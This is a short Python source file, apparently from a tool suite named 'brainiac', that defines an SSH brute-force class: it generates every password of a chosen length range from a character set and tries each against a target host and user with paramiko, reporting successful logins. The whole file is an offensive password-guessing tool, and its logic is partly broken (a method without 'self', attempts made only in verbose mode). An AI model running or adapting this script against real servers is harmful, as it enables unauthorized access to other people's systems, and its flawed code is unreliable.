import paramiko
from brainiac_libs.brainiac_debug.debug import Debug
import sys,os,socket
import itertools
from brainiac_libs.brainiac_debug.debug import Debug
class Ssh_brute:
    def __init__(self,hostname,user,minimo,maximo,char,filebr="",key=""):
        self.hostname=hostname
        self.user=user
        self.minimo=minimo
        self.maximo=maximo
        self.char=char
        self.filebr=filebr
        self.key=key

    def ssh_brute(hostname,user,minimo="",maximo="",char="",verbose=""):
        min = minimo
        max = maximo
        chrs = char
        min_length, max_length = int(min), int(max)
        for n in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=n):
                if verbose == True:
                    passw = ''.join(xs)
                    try:
                        s = paramiko.SSHClient();
                        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        s.load_system_host_keys();
                        s.connect(hostname=hostname, username=user, password=passw)
                        Debug.AVISO("[+] Success! %s => %s"%(user,passw))
                        break
                    except socket.gaierror:
                        print("invalid host!")
                        break
                    except paramiko.AuthenticationException:
                        Debug.ERRO("[-] falha:%s => %s"%(user,passw))
                    except paramiko.ssh_exception.SSHException:
                        print("erro")
                        pass
                else:
                    pass

